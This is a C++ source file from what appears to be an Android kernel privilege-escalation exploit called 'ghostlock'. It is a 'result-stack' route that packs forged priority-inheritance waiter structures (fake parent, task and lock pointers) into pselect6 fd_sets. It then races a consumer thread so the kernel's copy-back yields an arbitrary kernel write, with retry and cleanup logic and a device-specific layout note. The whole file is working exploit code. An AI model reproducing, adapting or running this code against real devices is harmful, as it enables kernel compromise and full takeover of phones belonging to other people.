#include "route/result_stack_route.h"

#include <unistd.h>

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::result_stack {
    ResultStackRoute::ResultStackRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value,
        profile::ResultStackLayout route_layout,
        const std::array<int32_t, 3> &stdio_backup_value) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = support::BorrowedFd(stdio_backup_value[fd]);
        }
        input_set.zero();
        output_set.zero();
        exception_set.zero();
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
        status.code = ROUTE_RETRYABLE;
    }

    ResultStackRoute::ResultStackRoute(ResultStackRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          layout(other.layout),
          input_set(other.input_set),
          output_set(other.output_set),
          exception_set(other.exception_set),
          owned_input_set(other.owned_input_set),
          owned_output_set(other.owned_output_set),
          owned_exception_set(other.owned_exception_set),
          ready_fd(std::move(other.ready_fd)),
          peer_fd(std::move(other.peer_fd)),
          selected_fds_installed(other.selected_fds_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          select_result(other.select_result),
          select_errno(other.select_errno),
          status(other.status) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = other.stdio_backup[fd];
        }
        other.selected_fds_installed = 0;
    }

    int32_t ResultStackRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void ResultStackRoute::disarm() noexcept {
        if (!race) {
            status.kernel_disarmed = 1;
            return;
        }
        race->consumer_go.store(0);
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0; i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void ResultStackRoute::retain_for_process_lifetime() noexcept {
        (void) ready_fd.release_to_process_lifetime("result-stack consumer stuck");
        (void) peer_fd.release_to_process_lifetime("result-stack consumer stuck");
        /* The low descriptors are deliberately left installed as well. */
    }

    void ResultStackRoute::close_selected_fds() noexcept {
        if (!selected_fds_installed) return;
        for (int32_t fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (owned_input_set.test(fd) || owned_output_set.test(fd) ||
                owned_exception_set.test(fd)) {
                close(fd);
            }
        }
        selected_fds_installed = 0;
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
    }

    void ResultStackRoute::destroy() noexcept {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            if (stdio_backup[fd].valid())
                dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
        }
        if (consumer_stuck) {
            (void) fail(34, select_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            retain_for_process_lifetime();
            return;
        }
        close_selected_fds();
        ready_fd.reset();
        peer_fd.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed)
            status.code = ROUTE_FALLBACK_SAFE;
    }
} // namespace ghostlock::route::result_stack

#if defined(__ANDROID__)
#include "common.h"

#include <cerrno>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/syscall.h>

#include "kernel/target.h"
#include "route/route_api.hpp"
#include "route/route_lifecycle.hpp"
#include "session/exploit_session.hpp"

namespace ghostlock::route {
    namespace {
        constexpr int32_t kAttempts = 8;
        constexpr int32_t kFakeWaiterPrio = 130;
        constexpr int32_t kPselectInputSets = 3;

        void restore_result_standard_io(
            const std::array<support::BorrowedFd, 3> &backup) {
            for (size_t fd = 0; fd < backup.size(); fd++) {
                if (backup[fd].valid())
                    dup2(backup[fd].get(), static_cast<int32_t>(fd));
            }
        }

        void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
            auto *bits = reinterpret_cast<unsigned long *>(set);
            bits[word] = static_cast<unsigned long>(value);
        }

        int32_t words_per_set() {
            const int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
            return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
        }

        bool put_global_word(result_stack::ResultStackRoute *context,
                             int32_t global_word, uint64_t value) {
            if (global_word < 0) return false;
            const int32_t per_set = words_per_set();
            const int32_t set = global_word / per_set;
            const int32_t word = global_word % per_set;
            fd_set *target = nullptr;
            switch (set) {
                case 0: target = context->input_set.raw(); break;
                case 1: target = context->output_set.raw(); break;
                case 2: target = context->exception_set.raw(); break;
                default: return false;
            }
            fdset_put_word(target, word, value);
            return true;
        }

        int32_t waiter_shift(const result_stack::ResultStackRoute *context) {
            return session::g_exploit_session.profile.loaded()
                       ? context->layout.waiter_shift.value_or(0)
                       : kernel::PSELECT_WAITER_WORD_SHIFT;
        }

        void put_waiter_word(result_stack::ResultStackRoute *context,
                             int32_t waiter_word, uint64_t value,
                             const char *name) {
            int32_t global_word = waiter_shift(context) + waiter_word;
            const int32_t input_words = kPselectInputSets * words_per_set();
            /* The kernel copies three input sets into three result sets. For
             * OPD2515, shift 14 puts words 1..13 in that result area; fold them
             * back to the corresponding input word so the result copy produces
             * the requested waiter value. */
            if (global_word >= input_words && global_word < 2 * input_words)
                global_word -= input_words;
            if (!put_global_word(context, global_word, value)) {
                pr_warning("result-stack cannot place %s waiter_word=%d global_word=%d\n",
                           name, waiter_word, global_word);
            }
        }

        void build_fdsets(result_stack::ResultStackRoute *context) {
            context->input_set.zero();
            context->output_set.zero();
            context->exception_set.zero();
            const memory::WriteRequest *request = context->request;
            if (!request) return;

            uintptr_t parent = 0;
            uintptr_t right = 0;
            uintptr_t left = 0;
            if (request->preserve_child) {
                parent = session::g_exploit_session.heap.current.fake_right;
                left = request->target;
            } else {
                if (request->target < 8) return;
                parent = request->target - 8;
                right = session::g_exploit_session.heap.current.fake_right;
            }
            const struct {
                int32_t word;
                uint64_t value;
                const char *name;
            } words[] = {
                {0, parent, "tree_parent"},
                {1, right, "tree_right"},
                {2, left, "tree_left"},
                {3, kFakeWaiterPrio, "tree_prio"},
                {4, 0, "tree_deadline"},
                {5, parent, "pi_parent"},
                {6, right, "pi_right"},
                {7, left, "pi_left"},
                {8, kFakeWaiterPrio, "pi_prio"},
                {9, 0, "pi_deadline"},
                {10, session::g_exploit_session.heap.current.fake_task, "task"},
                {11, session::g_exploit_session.heap.current.fake_lock, "lock"},
                {12, 3, "wake_state"},
                {13, 0, "ww_ctx"},
            };
            for (const auto &word : words)
                put_waiter_word(context, word.word, word.value, word.name);
        }

        bool open_ready_selected_fds(result_stack::ResultStackRoute *context) {
            int32_t sockets[2] = {-1, -1};
            if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sockets) != 0)
                return false;
            const char normal = 'N';
            const char urgent = 'U';
            if (send(sockets[1], &normal, sizeof(normal), MSG_NOSIGNAL) != 1 ||
                send(sockets[1], &urgent, sizeof(urgent), MSG_OOB | MSG_NOSIGNAL) != 1) {
                const int saved = errno;
                close(sockets[0]);
                close(sockets[1]);
                errno = saved;
                return false;
            }
            int32_t ready = fcntl(sockets[0], F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 64);
            int32_t peer = fcntl(sockets[1], F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 65);
            const int saved = errno;
            close(sockets[0]);
            close(sockets[1]);
            errno = saved;
            if (ready < 0 || peer < 0) {
                if (ready >= 0) close(ready);
                if (peer >= 0) close(peer);
                return false;
            }
            for (int32_t fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
                if ((FD_ISSET(fd, context->input_set.raw()) ||
                     FD_ISSET(fd, context->output_set.raw()) ||
                     FD_ISSET(fd, context->exception_set.raw())) &&
                    dup2(ready, fd) < 0) {
                    const int dup_errno = errno;
                    close(ready);
                    close(peer);
                    errno = dup_errno;
                    return false;
                }
            }
            context->ready_fd.reset(ready);
            context->peer_fd.reset(peer);
            context->owned_input_set = context->input_set;
            context->owned_output_set = context->output_set;
            context->owned_exception_set = context->exception_set;
            context->selected_fds_installed = 1;
            return true;
        }
    } // namespace
} // namespace ghostlock::route

namespace ghostlock::route::result_stack {
    int32_t ResultStackRoute::prepare() noexcept {
        if (!session::g_exploit_session.heap.current.base ||
            !session::g_exploit_session.heap.current.fake_lock ||
            !session::g_exploit_session.heap.current.fake_fops || !request) {
            return fail(30, 0);
        }
        if (request->target < 8) return fail(31, EINVAL);
        route::build_fdsets(this);
        if (!route::open_ready_selected_fds(this)) return fail(32, errno);
        pr_info("result-stack setup shift=%d page=%016zx fake_lock=%016zx "
                "fake_task=%016zx in0=%016llx out0=%016llx ex0=%016llx\n",
                route::waiter_shift(this),
                session::g_exploit_session.heap.current.base,
                session::g_exploit_session.heap.current.fake_lock,
                session::g_exploit_session.heap.current.fake_task,
                static_cast<unsigned long long>(reinterpret_cast<unsigned long *>(input_set.raw())[0]),
                static_cast<unsigned long long>(reinterpret_cast<unsigned long *>(output_set.raw())[0]),
                static_cast<unsigned long long>(reinterpret_cast<unsigned long *>(exception_set.raw())[0]));
        return 0;
    }

    RouteStatus ResultStackRoute::execute() noexcept {
        int32_t calls_total = 0;
        int32_t successes_total = 0;
        for (int32_t attempt = 1; attempt <= route::kAttempts; attempt++) {
            if (attempt > 1) {
                close_selected_fds();
                ready_fd.reset();
                peer_fd.reset();
                if (!support::prepare_good_kernel_page(*request)) {
                    (void) fail(35, errno);
                    break;
                }
                route::build_fdsets(this);
                if (!route::open_ready_selected_fds(this)) {
                    (void) fail(36, errno);
                    break;
                }
            }
            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            race->route_delay_usec.store(0);
            race->consumer_go.store(0);
            errno = 0;
            select_result = static_cast<int32_t>(syscall(
                SYS_pselect6, PSELECT_ROUTE_NFDS, input_set.raw(),
                output_set.raw(), exception_set.raw(), nullptr, nullptr));
            select_errno = errno;
            if (select_result >= 0) {
                /* The waiter is now past pselect's copy-back. Trigger the
                 * consumer immediately, while this route frame remains alive. */
                race->consumer_go.store(attempt);
                int32_t drained = 0;
                while (race->consumer_go.load() == attempt && drained < 2000) {
                    usleep(1000);
                    drained++;
                }
                if (race->consumer_go.load() == attempt) {
                    race->consumer_go.store(0);
                    (void) fail(37, ETIMEDOUT);
                }
            } else {
                race->consumer_go.store(0);
            }
            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            pr_info("result-stack attempt=%d ret=%d errno=%d calls=%d success=%d\n",
                    attempt, select_result, select_errno, calls, successes);
            route::restore_result_standard_io(stdio_backup);
            if (calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            (void) fail(33, select_errno);
        }
        calls = calls_total;
        successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::result_stack

namespace ghostlock::route {
    RouteStatus do_result_stack_fake_lock_route(const memory::WriteRequest *request) {
        route::reserve_standard_io();
        result_stack::ResultStackRoute context(
            &session::g_exploit_session.race, request,
            session::g_exploit_session.profile,
            session::g_exploit_session.profile.result_stack_layout(),
            route::standard_io_backup_values());
        const RouteStatus status = run_route_lifecycle(context);
        if (context.status.code == ROUTE_DIRTY_FAILURE)
            pr_error("result-stack consumer still inflight; leaking route fds\n");
        pr_info("result-stack done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d\n", context.calls, context.successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number);
        return status;
    }
} // namespace ghostlock::route
#endif
